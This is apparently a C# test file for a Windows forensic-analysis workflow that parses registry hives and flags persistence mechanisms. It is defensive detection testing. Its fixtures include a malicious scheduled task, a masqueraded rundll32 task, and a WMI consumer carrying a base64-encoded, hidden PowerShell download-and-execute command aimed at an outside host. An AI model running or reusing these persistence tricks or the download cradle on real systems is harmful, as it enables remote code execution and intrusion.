using System;
using System.Linq;

using Camel.Environments;
using Camel.Workflows;
using Camel.Workflows.Models;

namespace Camel.Tests.Workflows;

public class WindowsAnalysisWorkflowTests : TestsRuntime
{
    public WindowsAnalysisWorkflowTests()
    {
        var sshconfig = LoadConfigFile("sshtestappsettings.json");
        sshenv = AuditEnvironment.CreateFromConfig(sshconfig);
        api = new CamelApi(sshenv, sshconfig);
        workflow = new WindowsAnalysisWorkflow(api);
    }

    [Fact]
    public async Task CanExtractKeyArtifacts()
    {
        // SYSTEM/SOFTWARE/SAM/SECURITY hives from the mounted Windows image (no NTUSER.DAT or Amcache.hve here).
        var r = await workflow.ExtractKeyArtifactsAsync($"{Modern}/Windows/System32/config");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result.AllEntries);
        Assert.Equal(16, r.Result.Artifacts.Length); // one bucket per Key Registry Artifact category

        KeyArtifact Get(string name) => Assert.Single(r.Result!.Artifacts, a => a.Name == name);

        // Artifacts that live in the SYSTEM/SOFTWARE hives are present in this mount.
        Assert.NotEmpty(Get("Shimcache").Entries);
        Assert.NotEmpty(Get("Services").Entries);
        Assert.NotEmpty(Get("Timezone").Entries);

        // Each bucket's entries genuinely match its key-path fragment.
        Assert.All(Get("Shimcache").Entries, e => Assert.Contains("appcompatcache", e.KeyPath!, StringComparison.OrdinalIgnoreCase));
        Assert.All(Get("Timezone").Entries, e => Assert.Contains("timezoneinformation", e.KeyPath!, StringComparison.OrdinalIgnoreCase));
        Assert.All(Get("Services").Entries, e => Assert.Contains(@"\services\", e.KeyPath!, StringComparison.OrdinalIgnoreCase));

        // Buckets only ever contain entries with a key path.
        Assert.All(r.Result.Artifacts, a => Assert.All(a.Entries, e => Assert.False(string.IsNullOrEmpty(e.KeyPath))));
    }

    [Fact]
    public async Task ExtractKeyArtifactsIsEmptyForNoHives()
    {
        // RECmd is lenient — a directory with no hives parses successfully but yields nothing, so the report
        // is well-formed (all 16 buckets present) but every bucket is empty.
        var r = await workflow.ExtractKeyArtifactsAsync("/mnt/does_not_exist/config");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result.AllEntries);
        Assert.Equal(16, r.Result.Artifacts.Length);
        Assert.All(r.Result.Artifacts, a => Assert.Empty(a.Entries));
    }

    [Fact]
    public async Task CanGetKnownExecutables()
    {
        var r = await workflow.GetKnownExecutablesAsync($"{Modern}/Windows/System32/config/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result);
        // Shimcache is an inventory of executables Windows has seen on disk.
        Assert.Contains(r.Result, e => e.Path.Contains(".exe", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task GetKnownExecutablesIsEmptyForMissingHive()
    {
        // AppCompatCacheParser exits cleanly but produces no output for a missing hive, so the workflow
        // succeeds with an empty inventory rather than failing.
        var r = await workflow.GetKnownExecutablesAsync("/mnt/does_not_exist/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result);
    }

    [Fact]
    public async Task CanGetExecutedBinaries()
    {
        var r = await workflow.GetExecutedBinariesAsync($"{Modern}/Windows/appcompat/Programs/Amcache.hve");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result);
        // Amcache's value is the SHA-1 + path of each binary (VirusTotal pivot).
        Assert.Contains(r.Result, e => !string.IsNullOrEmpty(e.SHA1) && !string.IsNullOrEmpty(e.FullPath));
    }

    [Fact]
    public async Task GetExecutedBinariesIsEmptyForMissingHive()
    {
        // AmcacheParser exits cleanly but produces no output for a missing hive, so the workflow succeeds
        // with an empty list rather than failing.
        var r = await workflow.GetExecutedBinariesAsync("/mnt/does_not_exist/Amcache.hve");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Empty(r.Result);
    }

    [Fact]
    public async Task CanFindPersistenceMechanisms()
    {
        const string config = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync(
            softwareHive: $"{config}/SOFTWARE",
            systemHive: $"{config}/SYSTEM",
            ntuserHive: $"{Modern}/Users/fredr/NTUSER.DAT");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.NotEmpty(r.Result.AllEntries);
        Assert.Equal(5, r.Result.Mechanisms.Length); // one bucket per persistence category

        PersistenceMechanism Get(string cat) => Assert.Single(r.Result!.Mechanisms, m => m.Category == cat);

        // Run keys: the SOFTWARE hive's HKLM Run holds SecurityHealth on this image.
        var runKeys = Get(WindowsAnalysisWorkflow.CatRunKeys);
        Assert.NotEmpty(runKeys.Entries);
        Assert.Contains(runKeys.Entries, e => e.Name == "SecurityHealth");

        // Services were enumerated from the SYSTEM hive (svc CSV), each with a backing image path.
        var services = Get(WindowsAnalysisWorkflow.CatServices);
        Assert.NotEmpty(services.Entries);
        Assert.Contains(services.Entries, e => !string.IsNullOrEmpty(e.Command));

        // Suspicion bookkeeping is consistent: flagged entries carry reasons, unflagged ones don't.
        Assert.All(r.Result.SuspiciousEntries, e => { Assert.True(e.Suspicious); Assert.NotEmpty(e.Reasons); });
        Assert.All(r.Result.AllEntries.Where(e => !e.Suspicious), e => Assert.Empty(e.Reasons));
    }

    [Fact]
    public async Task FindPersistenceMechanismsIsEmptyForMissingHives()
    {
        // rip.pl is lenient — it exits cleanly on a missing hive and yields no findings, so the workflow
        // succeeds with a well-formed but empty report (all 5 categories present, none populated).
        var r = await workflow.FindPersistenceMechanismsAsync("/mnt/does_not_exist/SOFTWARE", "/mnt/does_not_exist/SYSTEM");

        Assert.True(r.IsSuccess, r.Message);
        Assert.NotNull(r.Result);
        Assert.Equal(5, r.Result.Mechanisms.Length);
        Assert.Empty(r.Result.AllEntries);
        Assert.All(r.Result.Mechanisms, m => Assert.Empty(m.Entries));
    }

    [Fact]
    public async Task FlagsMaliciousScheduledTaskFromXml()
    {
        // Stage the real SRL "Collect Background Statistics" task (action: C:\Windows\Temp\1.bat) as an on-disk
        // UTF-16 Task XML — exactly how Windows stores it — so the parser must transcode it as it does for real
        // tasks. Registry TaskCache can't recover this command; the XML action parser can, so it must be flagged.
        const string dir = "/tmp/camel_tasks";
        const string xml =
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
            "  <RegistrationInfo><Author>shieldbase\\spsql</Author><URI>\\Collect Background Statistics</URI></RegistrationInfo>\n" +
            "  <Actions Context=\"Author\"><Exec><Command>C:\\Windows\\Temp\\1.bat</Command></Exec></Actions>\n" +
            "</Task>\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(xml));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d | iconv -f UTF-8 -t UTF-16 > '{dir}/Collect Background Statistics'", out _, false);

        const string cfg = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync($"{cfg}/SOFTWARE", $"{cfg}/SYSTEM", tasksDirectory: dir);

        Assert.True(r.IsSuccess, r.Message);
        var tasks = Assert.Single(r.Result!.Mechanisms, m => m.Category == WindowsAnalysisWorkflow.CatScheduledTasks);
        var evil = Assert.Single(tasks.Entries, e => e.Name == @"\Collect Background Statistics");
        Assert.Equal(@"C:\Windows\Temp\1.bat", evil.Command); // Exec action recovered from the XML
        Assert.True(evil.Suspicious);
        Assert.Contains(evil.Reasons, reason => reason.Contains("suspicious location"));
        Assert.Contains(r.Result.SuspiciousEntries, e => e.Name == @"\Collect Background Statistics");

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    [Fact]
    public async Task FlagsMasqueradedLolbinViaLolbas()
    {
        // A scheduled task launching rundll32.exe from C:\ProgramData (a LOLBin from a non-canonical path). The
        // path isn't in the default suspicious-location list, so the ONLY thing that can flag it is the LOLBAS
        // masquerade check — isolating that feature.
        const string dir = "/tmp/camel_tasks_lolbin";
        const string xml =
            "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
            "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
            "  <RegistrationInfo><URI>\\Updater</URI></RegistrationInfo>\n" +
            "  <Actions Context=\"Author\"><Exec><Command>C:\\ProgramData\\rundll32.exe</Command><Arguments>evil.dll,Start</Arguments></Exec></Actions>\n" +
            "</Task>\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(xml));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d | iconv -f UTF-8 -t UTF-16 > '{dir}/Updater'", out _, false);

        const string cfg = $"{Modern}/Windows/System32/config";
        var r = await workflow.FindPersistenceMechanismsAsync($"{cfg}/SOFTWARE", $"{cfg}/SYSTEM", tasksDirectory: dir);

        Assert.True(r.IsSuccess, r.Message);
        var evil = Assert.Single(r.Result!.SuspiciousEntries, e => e.Name == @"\Updater");
        Assert.Contains(evil.Reasons, reason => reason.Contains("non-canonical path"));

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    [Fact]
    public async Task FindsMaliciousWmiConsumer()
    {
        // Stage a synthetic OBJECTS.DATA carrying the real SRL "SystemPerformanceMonitor" subscription strings in
        // repository order (filter -> encoded-PowerShell command -> consumer name -> consumer ref -> filter ref),
        // plus a benign allow-listed subscription. strings extraction + parsing must surface only the malicious one.
        const string dir = "/tmp/camel_wmi";
        const string content =
            "PerformanceMonitor\n" +
            "powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA\n" +
            "SystemPerformanceMonitor\n" +
            "CommandLineEventConsumer.Name=\"SystemPerformanceMonitor\"\n" +
            "__EventFilter.Name=\"PerformanceMonitor\"\n" +
            "SCM Event Log Filter\n" +
            "NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\"\n" +
            "__EventFilter.Name=\"SCM Event Log Filter\"\n";
        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(content));
        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
        sshenv.ExecuteCommand("mkdir", $"-p {dir}", out _, false);
        sshenv.ExecuteCommand("echo", $"{b64} | base64 -d > {dir}/OBJECTS.DATA", out _, false);

        var r = await workflow.FindWmiPersistenceAsync($"{dir}/OBJECTS.DATA");

        Assert.True(r.IsSuccess, r.Message);
        var evil = Assert.Single(r.Result!.SuspiciousConsumers);
        Assert.Equal("SystemPerformanceMonitor", evil.Name);
        Assert.Equal("CommandLineEventConsumer", evil.Type);
        Assert.Equal("PerformanceMonitor", evil.FilterName);                       // recovered binding (trigger)
        Assert.Contains("downloadstring", evil.DecodedCommand ?? "");              // decoded encoded-PowerShell payload
        Assert.Contains("squirreldirectory.com", evil.DecodedCommand ?? "");       // revealed C2
        Assert.Contains(evil.Reasons, x => x.Contains("remote-download"));

        sshenv.ExecuteCommand("rm", $"-rf {dir}", out _, false);
    }

    const string Modern = "/mnt/ewf";

    AuditEnvironment sshenv;
    CamelApi api;
    WindowsAnalysisWorkflow workflow;
}
